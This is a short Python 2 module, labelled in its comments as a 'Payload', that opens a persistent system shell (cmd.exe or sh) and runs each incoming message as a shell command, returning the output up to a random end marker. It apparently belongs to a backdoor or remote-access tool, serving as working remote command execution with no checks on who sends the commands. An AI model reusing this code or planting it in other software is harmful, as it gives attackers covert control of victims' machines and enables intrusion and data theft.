
def init( storage ) :
	from subprocess import Popen, PIPE
	import os
	# print "Payload init()"
	os_specs = {
			'nt' : {'shell':'cmd.exe', 'comm_sep' : '&'},
			'posix' : {'shell':'sh', 'comm_sep' : ';'}
		}
	storage['os_specs'] = os_specs
	# print shell
	storage['process'] = Popen( [os_specs[os.name]['shell']], stdout=PIPE, stderr=PIPE, stdin=PIPE, shell = True, bufsize = -1 )
	return True


def work( storage, message ) :
	p = storage['process']
	from select import select
	from time import sleep
	# print "Payload work()"
	import os

	mark = os.urandom(4).encode('hex')
	command = "{command} {comm_sep} echo {token} {linesep}".format(command=message,
		comm_sep = storage['os_specs'][os.name]['comm_sep'],
		linesep=os.linesep,
		token= mark)
	# print command, command.encode('hex')
	p.stdin.write(command)
	p.stdin.flush()
	stdout_ret = ''
	while True :
		stdout_data = p.stdout.readline()
		# print "STDOUT: '%s'"% stdout_data
		if mark in stdout_data or not stdout_data:
			# print stdout_data.startswith(mark)
			break
		stdout_ret += stdout_data
	return stdout_ret
